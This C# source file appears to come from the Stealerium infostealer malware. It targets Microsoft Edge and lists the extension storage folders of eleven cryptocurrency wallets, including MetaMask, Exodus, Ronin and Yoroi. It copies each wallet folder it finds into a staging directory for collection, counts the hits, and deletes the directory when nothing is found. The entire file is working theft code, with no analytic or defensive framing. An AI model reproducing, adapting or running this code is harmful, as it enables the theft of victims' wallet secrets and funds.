using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Edge
{
    internal class Extensions
    {
        private static readonly List<string[]> EdgeWalletsDirectories = new List<string[]>
        {
            new[]
            {
                "Edge_Auvitas",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\klfhbdnlcfcaccoakhceodhldjojboga"
            },
            new[]
            {
                "Edge_Math",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dfeccadlilpndjjohbjdblepmjeahlmm"
            },
            new[]
            {
                "Edge_Metamask",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"
            },
            new[]
            {
                "Edge_MTV",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\oooiblbdpdlecigodndinbpfopomaegl"
            },
            new[]
            {
                "Edge_Rabet",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\aanjhgiamnacdfnlfnmgehjikagdbafd"
            },
            new[]
            {
                "Edge_Ronin",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\bblmcdckkhkhfhhpfcchlpalebmonecp"
            },
            new[]
            {
                "Edge_Yoroi",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb"
            },
            new[]
            {
                "Edge_Zilpay",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\fbekallmnjoeggkefjkbebpineneilec"
            },
            new[]
            {
                "Edge_Exodus",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\jdiccldimpdaibmpdkjnbmckianbfold"
            },
            new[]
            {
                "Edge_Terra_Station",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ajkhoeiiokighlmdnlakpjfoobnjinie"
            },
            new[]
            {
                "Edge_Jaxx",
                Paths.Lappdata +
                "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dmdimapfghaakeibppbfeokhgoikeoci"
            }
        };

        public static void GetEdgeWallets(string sSaveDir)
        {
            try
            {
                Directory.CreateDirectory(sSaveDir);

                foreach (var array in EdgeWalletsDirectories) CopyWalletFromDirectoryTo(sSaveDir, array[1], array[0]);
                if (Counter.BrowserWallets == 0) Filemanager.RecursiveDelete(sSaveDir);
            }
            catch (Exception ex)
            {
                Logging.Log("Edge Browser Wallets >> Failed to collect wallets from Edge browser\n" + ex);
            }
        }

        // Copy wallet files to directory
        private static void CopyWalletFromDirectoryTo(string sSaveDir, string sWalletDir, string sWalletName)
        {
            var sdir = Path.Combine(sSaveDir, sWalletName);
            if (!Directory.Exists(sWalletDir)) return;
            Filemanager.CopyDirectory(sWalletDir, sdir);
            Counter.BrowserWallets++;
        }
    }
}